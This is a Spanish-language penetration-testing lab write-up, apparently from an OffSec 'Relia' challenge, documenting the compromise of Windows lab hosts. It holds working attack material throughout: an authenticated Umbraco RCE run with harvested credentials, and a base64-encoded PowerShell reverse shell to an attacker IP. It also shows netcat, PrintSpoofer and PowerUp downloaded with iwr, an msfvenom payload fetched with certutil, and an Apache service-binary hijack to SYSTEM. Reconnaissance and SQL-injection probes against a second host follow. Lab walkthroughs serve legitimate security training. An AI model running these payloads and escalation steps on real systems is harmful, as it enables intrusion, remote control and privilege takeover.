> Podemos elegir entre la 2 o 3 opcion.. se adapta mejor al escenario
#### Generamos un mirror del exploit y analizamos sus requerimientos:

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/247-machine]
‚îî‚îÄ# searchsploit -m 49488
  Exploit: Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/49488
     Path: /usr/share/exploitdb/exploits/aspx/webapps/49488.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (723)
Copied to: /home/kali/OffSec/Challenges/2_Relia/247-machine/49488.py
```
- Usamos las credenciales que encontramos en el pdf

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/247-machine]
‚îî‚îÄ# python2 49488.py -u "mark@relia.com" -p "OathDeeplyReprieve91" -i "http://web02.relia.com:14080" -c whoami
iis apppool\defaultapppool

                                                                                                                                                     
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/247-machine]
‚îî‚îÄ# python2 49488.py -u "mark@relia.com" -p "OathDeeplyReprieve91" -i "http://web02.relia.com:14080" -c ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.104.247
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.104.254

‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/247-machine]
‚îî‚îÄ# python2 49488.py -u "mark@relia.com" -p "OathDeeplyReprieve91" -i "http://web02.relia.com:14080" -c systeminfo   

Host Name:                 WEB02
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00454-10000-00001-AA804
Original Install Date:     10/12/2022, 7:53:02 PM
System Boot Time:          6/13/2025, 1:49:56 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,860 MB
Virtual Memory: Max Size:  5,503 MB
Virtual Memory: Available: 4,251 MB
Virtual Memory: In Use:    1,252 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB5004330
                           [02]: KB5005039
                           [03]: KB5005552
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.104.247
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

> Copiamos powershell.exe en nuestro directorio

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/247-machine]
‚îî‚îÄ# python2 49488.py -u "mark@relia.com" -p "OathDeeplyReprieve91" -i "http://web02.relia.com:14080" -c powershell.exe -a 'pwd'

Path                       
----                       
C:\windows\system32\inetsrv

                                                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/247-machine]
‚îî‚îÄ# python2 49488.py -u "mark@relia.com" -p "OathDeeplyReprieve91" -i "http://web02.relia.com:14080" -c powershell.exe -a 'whoami /priv'

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

#### Establecer conexion estable..

1. Preparamos el payload con **pwsh**

```bash
PS /home/kali/OffSec/Challenges/2_Relia/247-machine> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.213",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}'
PS /home/kali/OffSec/Challenges/2_Relia/247-machine> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS /home/kali/OffSec/Challenges/2_Relia/247-machine> $EncodedText = [Convert]::ToBase64String($Bytes)
PS /home/kali/OffSec/Challenges/2_Relia/247-machine> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0A
```
2. Ejecutamos el exploit con el receptor activo en el puerto 4444

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/247-machine]
‚îî‚îÄ# python2 49488.py -u "mark@relia.com" -p "OathDeeplyReprieve91" -i "http://web02.relia.com:14080" -c powershell.exe -a "-nop -w hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0A"
```
> En el receptor

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/247-machine]
‚îî‚îÄ# nc -lvnp 4444                                                                               
listening on [any] 4444 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.104.247] 59636
whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> cd C:\

PS C:\> dir

    Directory: C:\

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         11/4/2022   3:22 AM                ftp                                                                  
d-----        10/12/2022   2:33 PM                inetpub                                                              
d-----         6/13/2025   4:39 PM                Microsoft                                                            
d-----          5/8/2021   1:20 AM                PerfLogs                                                             
d-r---        10/12/2022   8:55 PM                Program Files                                                        
d-----          5/8/2021   2:39 AM                Program Files (x86)                                                  
d-r---        10/12/2022   2:34 PM                Users                                                                
d-----        10/12/2022   2:59 PM                Windows                                                              
d-----        10/12/2022   2:58 PM                xampp                                                                
-a----         6/13/2025   1:50 PM             34 local.txt                                                            
-a----         6/13/2025   1:49 PM           2689 output.txt                                                           


PS C:\> type  local.txt
e15f6403ccd84366de829e562049787a
PS C:\> 
```

#### Enumeracion basica 

1. A simple vista podemos intentar con PrintSpoof escalar privilegios

```powershell
PS C:\Users\Public\Documents> iwr -uri http://192.168.45.213:8000/nc.exe -Outfile nc.exe
PS C:\Users\Public\Documents> dir


    Directory: C:\Users\Public\Documents


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/14/2025   7:11 AM          59392 nc.exe                                                               


PS C:\Users\Public\Documents> iwr -uri http://192.168.45.213:8000/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
PS C:\Users\Public\Documents> dir


    Directory: C:\Users\Public\Documents


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/14/2025   7:11 AM          59392 nc.exe                                                               
-a----         6/14/2025   7:11 AM          27136 PrintSpoofer.exe                                                     


PS C:\Users\Public\Documents> .\PrintSpoofer.exe -c "C:\Users\Public\Documents\nc.exe 192.168.45.213 4445 -e cmd"
[+] Found privilege: SeImpersonatePrivilege                                                                                                                                                                       
[+] Named pipe listening...                                                                                                                                                                                       
[-] Operation failed or timed out.                                                                                                                                                                                
PS C:\Users\Public\Documents> Get-Service -Name PrintNotify                                                                                                                                                       
                                                                                                                                                                                                                  
Status   Name               DisplayName                                                                                                                                                                           
------   ----               -----------                                                                                                                                                                           
Stopped  PrintNotify        Printer Extensions and Notifications                                                                                                                                                  

PS C:\Users\Public\Documents> Start-Service -Name PrintNotify
PS C:\Users\Public\Documents> Get-Service -Name PrintNotify

Status   Name               DisplayName                           
------   ----               -----------                           
Stopped  PrintNotify        Printer Extensions and Notifications  

```
2. Buscamos con PowerUp:

```powershell
PS C:\Users\Public\Documents> iwr -uri http://192.168.45.213:8000/PowerUp.ps1 -Outfile PowerUp.ps1
PS C:\Users\Public\Documents> . .\PowerUp.ps1                                                                                                                                                                     
PS C:\Users\Public\Documents> Invoke-AllChecks                                                                                                                                                                    
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Privilege   : SeImpersonatePrivilege                                                                                                                                                                              
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED                                                                                                                                               
TokenHandle : 2632                                                                                                                                                                                                
ProcessId   : 3528                                                                                                                                                                                                
Name        : 3528                                                                                                                                                                                                
Check       : Process Token Privileges                                                                                                                                                                            
                                                                                                                                                                                                                  
ServiceName                     : Apache2.4                                                                                                                                                                       
Path                            : "C:\xampp\apache\bin\httpd.exe" -k runservice                                                                                                                                   
ModifiableFile                  : C:\xampp\apache\bin\httpd.exe                                                                                                                                                   
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}                                                                                                                           
ModifiableFileIdentityReference : BUILTIN\IIS_IUSRS                                                                                                                                                               
StartName                       : LocalSystem                                                                                                                                                                     
AbuseFunction                   : Install-ServiceBinary -Name 'Apache2.4'                                                                                                                                         
CanRestart                      : True                                                                                                                                                                            
Name                            : Apache2.4                                                                                                                                                                       
Check                           : Modifiable Service Files                                                                                                                                                        
                                                                                                                                                                                                                  
ServiceName                     : edgeupdate                                                                                                                                                                      
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc                                                                                                      
ModifiableFile                  : C:\                                                                                                                                                                             
ModifiableFilePermissions       : AppendData/AddSubdirectory                                                                                                                                                      
ModifiableFileIdentityReference : BUILTIN\Users                                                                                                                                                                   
StartName                       : LocalSystem                                                                                                                                                                     
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'                                                                                                                                        
CanRestart                      : False                                                                                                                                                                           
Name                            : edgeupdate                                                                                                                                                                      
Check                           : Modifiable Service Files                                                                                                                                                        
                                                                                                                                                                                                                  
ServiceName                     : edgeupdate                                                                                                                                                                      
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc                                                                                                      
ModifiableFile                  : C:\                                                                                                                                                                             
ModifiableFilePermissions       : WriteData/AddFile                                                                                                                                                               
ModifiableFileIdentityReference : BUILTIN\Users                                                                                                                                                                   
StartName                       : LocalSystem                                                                                                                                                                     
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'                                                                                                                                        
CanRestart                      : False                                                                                                                                                                           
Name                            : edgeupdate
Check                           : Modifiable Service Files

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False
Name                            : edgeupdatem
Check                           : Modifiable Service Files

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : WriteData/AddFile
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False
Name                            : edgeupdatem
Check                           : Modifiable Service Files
```

* Generamos un payload con msfvenom lo servimos y explotamos
1. Payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.213 LPORT=4455 -f exe > httpd.exe
python3 -m http.server 80
```
2. Explotamos
```powershell
cd C:\Windows\Tasks
PS C:\Windows\Tasks> dir
PS C:\Windows\Tasks> certutil.exe -urlcache -split -f "http://192.168.45.213/httpd.exe" httpd.exe
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.
PS C:\Windows\Tasks> dir


    Directory: C:\Windows\Tasks


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/14/2025   7:07 PM           7168 httpd.exe                                                            


PS C:\Windows\Tasks> Stop-Service Apache2.4
PS C:\Windows\Tasks> ren C:\xampp\apache\bin\httpd.exe httpd.exe.bak
PS C:\Windows\Tasks> copy C:\Windows\Tasks\httpd.exe C:\xampp\apache\bin\httpd.exe
PS C:\Windows\Tasks> Start-Service Apache2.4
PS C:\Windows\Tasks>
```
3. Receptor
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/1_Medtech/fwindows]
‚îî‚îÄ# nc -lvnp 4455
listening on [any] 4455 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.104.247] 49748
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 668E-8D92

 Directory of C:\Users\Administrator

02/28/2023  02:14 PM    <DIR>          .
10/12/2022  02:34 PM    <DIR>          ..
10/12/2022  08:53 PM    <DIR>          3D Objects
10/12/2022  08:53 PM    <DIR>          Contacts
10/12/2022  08:53 PM    <DIR>          Desktop
10/12/2022  08:53 PM    <DIR>          Documents
10/12/2022  08:53 PM    <DIR>          Downloads
10/12/2022  08:53 PM    <DIR>          Favorites
10/12/2022  08:53 PM    <DIR>          Links
10/12/2022  08:53 PM    <DIR>          Music
10/12/2022  08:53 PM    <DIR>          Pictures
10/12/2022  08:53 PM    <DIR>          Saved Games
10/12/2022  08:53 PM    <DIR>          Searches
10/12/2022  08:53 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  11,385,585,664 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 668E-8D92

 Directory of C:\Users\Administrator\Desktop

06/14/2025  06:57 PM    <DIR>          .
02/28/2023  02:14 PM    <DIR>          ..
06/14/2025  06:57 PM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)  11,385,585,664 bytes free

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
90441a5c98c6c81e4668c7467d64caa6

C:\Users\Administrator\Desktop>

```

### EXTERNAL

1. Escaneo basico:

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/248-machine]
‚îî‚îÄ# nmap -sV -p- -T4 192.168.231.248 -oN ports-services.txt                                 

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-15 07:54 -03
Nmap scan report for 192.168.231.248
Host is up (0.16s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49965/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 837.37 seconds
```
* Directorios:
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# gobuster dir -u 192.168.231.248 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.231.248
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 301) [Size: 140] [--> http://192.168.231.248/]
/login                (Status: 200) [Size: 23091]
/privacy              (Status: 200) [Size: 33566]
/register             (Status: 302) [Size: 167] [--> http://192.168.231.248/Login?returnurl=%2fregister]
/terms                (Status: 200) [Size: 51543]
/admin                (Status: 302) [Size: 164] [--> http://192.168.231.248/Login?returnurl=%2fadmin]
/Home                 (Status: 301) [Size: 140] [--> http://192.168.231.248/]
/Privacy              (Status: 200) [Size: 33566]
/Login                (Status: 200) [Size: 23091]
/Terms                (Status: 200) [Size: 51543]
/Register             (Status: 302) [Size: 167] [--> http://192.168.231.248/Login?returnurl=%2fRegister]
/host                 (Status: 302) [Size: 183] [--> http://192.168.231.248/Host/ctl/Login/portalid/0?returnurl=%2fhost]
/SearchResults        (Status: 301) [Size: 154] [--> http://192.168.231.248/Search-Results]
/searchresults        (Status: 301) [Size: 154] [--> http://192.168.231.248/Search-Results]
/Admin                (Status: 302) [Size: 164] [--> http://192.168.231.248/Login?returnurl=%2fAdmin]
/*checkout*           (Status: 400) [Size: 3490]
/HOME                 (Status: 301) [Size: 140] [--> http://192.168.231.248/]
/*docroot*            (Status: 400) [Size: 3490]
/*                    (Status: 400) [Size: 3490]
/logoff               (Status: 302) [Size: 140] [--> http://192.168.231.248/]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3490]
/searchResults        (Status: 301) [Size: 154] [--> http://192.168.231.248/Search-Results]
/http%3A              (Status: 400) [Size: 3490]
/**http%3a            (Status: 400) [Size: 3490]
/*http%3A             (Status: 400) [Size: 3490]
/PRIVACY              (Status: 200) [Size: 33566]
/**http%3A            (Status: 400) [Size: 3490]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 3490]
/search-results       (Status: 200) [Size: 32372]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 3490]
/http%3A%2F%2Fblog    (Status: 400) [Size: 3490]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 3490]
/LogIn                (Status: 200) [Size: 23091]
/%3FRID%3D2671        (Status: 400) [Size: 3490]
/devinmoore*          (Status: 400) [Size: 3490]
/Searchresults        (Status: 301) [Size: 154] [--> http://192.168.231.248/Search-Results]
/LOGIN                (Status: 200) [Size: 23091]
/200109*              (Status: 400) [Size: 3490]
/*sa_                 (Status: 400) [Size: 3490]
/*dc_                 (Status: 400) [Size: 3490]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 3490]
/http%3A%2F%2Fradar   (Status: 400) [Size: 3490]
/login%3f             (Status: 400) [Size: 3490]
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 3490]
/http%3A%2F%2Fweblog  (Status: 400) [Size: 3490]
/http%3A%2F%2Fswik    (Status: 400) [Size: 3490]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

- Identificamos un cms:

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# searchsploit dnn       
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DotNetNuke DNNArticle Module 10.0 - SQL Injection                                                                                                                               | php/webapps/27602.txt
DotNetNuke DNNarticle Module 11 - Directory Traversal                                                                                                                           | windows/webapps/44414.txt
DotNetNuke DNNspot Store 3.0.0 - Arbitrary File Upload (Metasploit)                                                                                                             | windows/webapps/35039.rb
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

# En MSF tenemos opciones de exploit
msf6 > search type:exploit DotNetNuke

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/windows/http/dnn_cookie_deserialization_rce  2017-07-20       excellent  Yes    DotNetNuke Cookie Deserialization Remote Code Excecution
   1    \_ target: Automatic                               .                .          .      .
   2    \_ target: v5.0 - v9.0.0                           .                .          .      .
   3    \_ target: v9.0.1 - v9.1.1                         .                .          .      .
   4    \_ target: v9.2.0 - v9.2.1                         .                .          .      .
   5    \_ target: v9.2.2 - v9.3.0-RC                      .                .          .      .
```

- Buscando informacion en la pagina encontramos un nombre de usuario:

> SERVICE CONTACT : emma@relia.com

- Observamos las cookies:

```
.ASPXANONYMOUS: IMtJrD6O6sbPkDFkdUV1v99qx10pS1Pdu7IpGDu4FZ5z_gvTkDFWMDTw88TxTV-E30OHM66S60eI144IQL-W4LKZhslJ1RxZCc02_cxuMmpFPvee0
__RequestVerificationToken: 75Xqa0X5v6T05KqiSMhesSg2k-w7eBLO830N8-4I-wbTjRU75_F0ezbDY-jtldnCZUJKEg2
dnn_IsMobile: false
language: en-US
```

Luego de intentar con el exploit **27602** inyecciones sql sobre:

```bash
curl -i "http://192.168.231.248/DesktopModules/DNNArticle/rss.aspx?moduleid=0&categoryid=1+or+1=@@version"
HTTP/1.1 200 OK
Cache-Control: public, no-cache="Set-Cookie"
Content-Type: text/xml
Expires: Sun, 15 Jun 2025 14:12:24 GMT
Vary: *
Set-Cookie: dnn_IsMobile=False; path=/; HttpOnly
Set-Cookie: .ASPXANONYMOUS=5Oqx7hGL0Kcd5Y42B156OFO8l9KPRTcGWqS8kgNkvgGhXazzIXQZkkm9fpbXrpIR0VIjRaeMVNmJTvxfYEN91eODH5IB1d-lEA8vCCW1FXjNEkfT0; expires=Sun, 24-Aug-2025 00:51:24 GMT; path=/; HttpOnly
X-XSS-Protection: 1; mode=block
X-Frame-Options: SAMEORIGIN
Date: Sun, 15 Jun 2025 14:11:23 GMT
Content-Length: 266

<?xml version="1.0"?><rss version="2.0"><channel><title>RELIA</title><link>http://192.168.231.248</link><description>RELIA</description><language>en-US</language><copyright>Copyright 2025 by My Website</copyright><webMaster>emma@relia.com</webMaster></channel></rss>
```
> No se obtienen resultados interesantes.. y pasamos al exploit de **MSF**

- Se buscaron archivos que permitan la ejecucion del payload:
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/248-machine]
‚îî‚îÄ# gobuster dir -u http://192.168.231.248/DesktopModules/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x aspx,ashx,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.231.248/DesktopModules/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              aspx,ashx,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 167] [--> http://192.168.231.248/DesktopModules/admin/]
/rss.aspx             (Status: 200) [Size: 57]
/Admin                (Status: 301) [Size: 167] [--> http://192.168.231.248/DesktopModules/Admin/]
/sitemap.aspx         (Status: 200) [Size: 663]
/html                 (Status: 301) [Size: 166] [--> http://192.168.231.248/DesktopModules/html/]
/logoff.aspx          (Status: 302) [Size: 155] [--> http://192.168.231.248/Home/ctl/LogOff]
/.                    (Status: 403) [Size: 1233]
